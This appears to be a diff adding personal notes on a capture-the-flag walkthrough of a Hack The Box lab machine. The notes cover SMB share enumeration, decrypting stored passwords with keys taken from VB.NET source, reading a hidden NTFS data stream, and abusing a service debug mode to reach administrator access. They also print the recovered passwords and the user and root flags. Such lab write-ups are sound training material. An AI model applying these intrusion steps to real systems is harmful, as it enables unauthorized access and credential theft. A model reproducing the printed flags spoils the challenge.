@@ -1,0 +1,147 @@
+nmap -sC -sV -oN nmap 10.10.10.178 -v -A
+
+port 445 = smbclient
+
+$ smbclient -L //10.10.10.178
+
+Enter WORKGROUP\root's password:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Data            Disk
+	IPC$            IPC       Remote IPC
+	Secure$         Disk
+	Users           Disk
+SMB1 disabled -- no workgroup available
+
+smbclient //10.10.10.178/Data
+-> in \Shared\Templates\HR\ get "Welcome Email.txt"
+get doesnt work but mget * does
+
+Username: TempUser
+Password: welcome2019
+
+smbclient //10.10.10.178/Users -U TempUser
+-> in \TempUser\ get "New Text Document.txt"
+but empty
+
+go back to data as TempUser -> can access Configs
+
+in RU_config.xml:
+  <Username>c.smith</Username>
+  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
+but cant decrypt passwd
+
+in notepad++ config we can see path:
+\\HTB-NEST\Secure$\IT\Carl\Temp.txt
+-> smblient in Secure$ as TempUser and even if IT not listable
+-> can go to \IT\Carl
+
+find intersting file in \IT\Carl\VB Projects\WIP\RU\RUScanner: Utils.vb
+```VB.NET
+...
+Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+...
+```
+
+google N3st22 encryption
+https://dotnetfiddle.net/bjoBP6
+Console.WriteLine("Decrypted: " + DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="))
+-> carl password xRxRxPANCAK3SxRxRx
+
+connect to /users with pass and get user flag in carl dir
+
+`cf71b25404be5d84fd827e05f426e987`
+
+find binary in
+\C.Smith\HQK Reporting\AD Integration Module\ -> HqkLdap.exe
+lets run it on windows and reverse it
+
+run it -> doesnt work but source code show it's basically a ldap request
+
+saw decrypt encrypt function with
+`return string.IsNullOrEmpty(EncryptedString) ? string.Empty : CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);`
+
+found here:
+https://dotnetfiddle.net/1ca3i6
+
+the exact function -> now i need to find to pass to decrypt
+
+in \C.Smith\HQK Reporting\, "Debug Mode Password.txt" is empty which is strange
+NTFS partition so -> allinfo "Debug Mode Password.txt"
+
+```
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
+access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
+write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
+change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+```
+
+get "Debug Mode Password.txt":password to dl on thhe password stream
+-> WBQ201953D8w
+
+dir name is "HQK Reporting" and in conf file we have port 4386 -> lets nc
+nc 10.10.10.178 4386 -> doesnt work
+telnet 10.10.10.178 4386 -> does work
+
+```
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+```
+
+```
+>DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+>HELP
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+SERVICE
+SESSION
+SHOWQUERY <Query_ID>
+```
+
+setdir .. then list to list files -> can start searching now
+
+in LDAP -> Ldap.conf:
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+
+same that on the website... so admin pass is
+XtH4nkS4Pl4y1nGX
+
+smbclient //10.10.10.178/Users -U Administrator
+find flag link to c$
+
+smbclient //10.10.10.178/C$ -U Administrator
+-> get root flag
+
+6594c2eb084bc0f08a42f0b94b878c41
